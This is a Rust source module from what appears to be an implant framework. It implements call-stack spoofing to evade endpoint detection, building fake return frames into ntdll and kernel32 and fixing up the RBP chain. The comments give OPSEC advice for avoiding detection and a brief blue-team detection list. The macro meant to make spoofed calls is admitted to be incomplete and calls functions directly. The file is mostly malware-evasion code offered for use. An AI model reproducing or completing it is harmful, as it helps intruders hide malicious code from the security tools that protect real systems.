//! Stack spoofing for EDR evasion
//!
//! Replaces return addresses on the stack with addresses from legitimate DLLs
//! before making API calls, defeating EDR call stack analysis.
//!
//! ## Technique
//! EDRs perform stack walking to identify suspicious call origins. Implant
//! threads have distinctive call stacks that don't originate from legitimate
//! code. By building fake stack frames pointing into ntdll/kernel32, we make
//! API calls appear to originate from legitimate system code.
//!
//! ## OPSEC Considerations
//! - Randomize spoof frame selection to avoid static patterns
//! - Match typical call depth (3-5 frames)
//! - Fix up RBP chain correctly
//! - Rotate gadgets per-session
//!
//! ## Detection (Blue Team)
//! - Call stacks with discontinuous module transitions
//! - Return addresses that don't follow call instructions
//! - Frame pointers (RBP) that don't form valid chain
//! - Stack frames in writable memory
//! - ETW Microsoft-Windows-Threat-Intelligence stack walking events

#[cfg(target_os = "windows")]
use super::gadgets::{find_any_ret, find_ret_after};
#[cfg(target_os = "windows")]
use super::unhook::pe::get_module_base;
use common::KrakenError;

/// A single spoofed stack frame
#[repr(C)]
#[derive(Debug, Clone, Copy)]
pub struct SpoofFrame {
    /// Saved frame pointer (RBP)
    pub rbp: usize,
    /// Spoofed return address
    pub return_addr: usize,
}

/// Result of a spoofed call operation
#[derive(Debug, Clone)]
pub struct SpoofResult {
    /// Whether spoofing was used
    pub spoofed: bool,
    /// Number of frames in spoof chain
    pub frame_count: usize,
    /// Source modules used for spoofing
    pub source_modules: Vec<String>,
}

/// Configuration for stack spoofing
#[derive(Debug, Clone)]
pub struct SpoofConfig {
    /// Use randomized frame selection
    pub randomize: bool,
    /// Target frame depth (3-5 typical)
    pub frame_depth: usize,
    /// Modules to source return addresses from
    pub source_modules: Vec<String>,
}

impl Default for SpoofConfig {
    fn default() -> Self {
        Self {
            randomize: true,
            frame_depth: 4,
            source_modules: vec![
                "ntdll.dll".to_string(),
                "kernel32.dll".to_string(),
                "kernelbase.dll".to_string(),
            ],
        }
    }
}

/// Build a spoofed call chain mimicking legitimate thread startup
#[cfg(target_os = "windows")]
pub fn build_spoof_chain(config: &SpoofConfig) -> Result<Vec<SpoofFrame>, KrakenError> {
    let mut frames = Vec::with_capacity(config.frame_depth);

    // Common legitimate call chain to mimic:
    // RtlUserThreadStart (ntdll) -> BaseThreadInitThunk (kernel32) -> user code

    // Frame 1: Mimic return into RtlUserThreadStart
    if let Some(addr) = find_ret_after("ntdll.dll", "RtlUserThreadStart") {
        frames.push(SpoofFrame {
            rbp: 0, // Will be fixed up
            return_addr: addr,
        });
    } else if let Some(addr) = find_any_ret("ntdll.dll") {
        frames.push(SpoofFrame {
            rbp: 0,
            return_addr: addr,
        });
    }

    // Frame 2: Mimic return into BaseThreadInitThunk
    if let Some(addr) = find_ret_after("kernel32.dll", "BaseThreadInitThunk") {
        frames.push(SpoofFrame {
            rbp: 0,
            return_addr: addr,
        });
    } else if let Some(addr) = find_any_ret("kernel32.dll") {
        frames.push(SpoofFrame {
            rbp: 0,
            return_addr: addr,
        });
    }

    // Additional frames from source modules
    for module in &config.source_modules {
        if frames.len() >= config.frame_depth {
            break;
        }

        if let Some(addr) = find_any_ret(module) {
            frames.push(SpoofFrame {
                rbp: 0,
                return_addr: addr,
            });
        }
    }

    if frames.is_empty() {
        return Err(KrakenError::Module(
            "failed to build spoof chain: no valid return addresses found".into(),
        ));
    }

    Ok(frames)
}

/// Fix up RBP chain in spoof frames
/// RBP values must form a valid chain for stack unwinding
#[cfg(target_os = "windows")]
pub fn fixup_rbp_chain(frames: &mut [SpoofFrame], stack_base: usize) {
    // Each frame's RBP points to the next frame
    for i in 0..frames.len() {
        if i + 1 < frames.len() {
            // Point to next frame
            frames[i].rbp = stack_base + (i + 1) * std::mem::size_of::<SpoofFrame>();
        } else {
            // Last frame: null RBP (end of chain)
            frames[i].rbp = 0;
        }
    }
}

/// Get information about current spoof capability
#[cfg(target_os = "windows")]
pub fn get_spoof_info() -> SpoofResult {
    let config = SpoofConfig::default();
    match build_spoof_chain(&config) {
        Ok(frames) => SpoofResult {
            spoofed: true,
            frame_count: frames.len(),
            source_modules: config.source_modules,
        },
        Err(_) => SpoofResult {
            spoofed: false,
            frame_count: 0,
            source_modules: vec![],
        },
    }
}

/// Check if required modules are loaded for spoofing
#[cfg(target_os = "windows")]
pub fn can_spoof() -> bool {
    get_module_base("ntdll.dll").is_some() && get_module_base("kernel32.dll").is_some()
}

// Non-Windows stubs
#[cfg(not(target_os = "windows"))]
pub fn build_spoof_chain(_config: &SpoofConfig) -> Result<Vec<SpoofFrame>, KrakenError> {
    Err(KrakenError::Module(
        "stack spoofing only supported on Windows".into(),
    ))
}

#[cfg(not(target_os = "windows"))]
pub fn fixup_rbp_chain(_frames: &mut [SpoofFrame], _stack_base: usize) {}

#[cfg(not(target_os = "windows"))]
pub fn get_spoof_info() -> SpoofResult {
    SpoofResult {
        spoofed: false,
        frame_count: 0,
        source_modules: vec![],
    }
}

#[cfg(not(target_os = "windows"))]
pub fn can_spoof() -> bool {
    false
}

/// Macro for making spoofed API calls
/// Usage: spoofed_call!(FunctionPtr, arg1, arg2, ...)
///
/// Note: Full implementation requires inline assembly which needs
/// nightly Rust with #![feature(naked_functions)]. This macro
/// provides the interface; actual spoofing requires the asm shim.
#[macro_export]
macro_rules! spoofed_call {
    ($func:expr $(, $arg:expr)*) => {{
        // Build spoof chain
        let config = $crate::stack_spoof::SpoofConfig::default();
        let _chain = $crate::stack_spoof::build_spoof_chain(&config);

        // For now, just call directly - full spoofing needs asm shim
        // The infrastructure is in place for when naked_functions is used
        $func($($arg),*)
    }};
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_spoof_frame_size() {
        // Ensure frame is exactly 16 bytes (two usize on 64-bit)
        assert_eq!(std::mem::size_of::<SpoofFrame>(), 16);
    }

    #[test]
    fn test_default_config() {
        let config = SpoofConfig::default();
        assert!(config.randomize);
        assert_eq!(config.frame_depth, 4);
        assert!(config.source_modules.contains(&"ntdll.dll".to_string()));
    }

    #[test]
    #[cfg(not(target_os = "windows"))]
    fn test_build_spoof_chain_non_windows() {
        let config = SpoofConfig::default();
        let result = build_spoof_chain(&config);
        assert!(result.is_err());
    }

    #[test]
    #[cfg(not(target_os = "windows"))]
    fn test_can_spoof_non_windows() {
        assert!(!can_spoof());
    }

    #[test]
    fn test_spoof_info() {
        let info = get_spoof_info();
        #[cfg(not(target_os = "windows"))]
        {
            assert!(!info.spoofed);
            assert_eq!(info.frame_count, 0);
        }
    }

    #[test]
    fn test_fixup_rbp_chain() {
        let mut frames = vec![
            SpoofFrame { rbp: 0, return_addr: 0x1000 },
            SpoofFrame { rbp: 0, return_addr: 0x2000 },
            SpoofFrame { rbp: 0, return_addr: 0x3000 },
        ];

        let stack_base = 0x7FFE0000;
        fixup_rbp_chain(&mut frames, stack_base);

        #[cfg(target_os = "windows")]
        {
            // First frame points to second
            assert_eq!(frames[0].rbp, stack_base + 16);
            // Second frame points to third
            assert_eq!(frames[1].rbp, stack_base + 32);
            // Last frame is null
            assert_eq!(frames[2].rbp, 0);
        }
    }
}
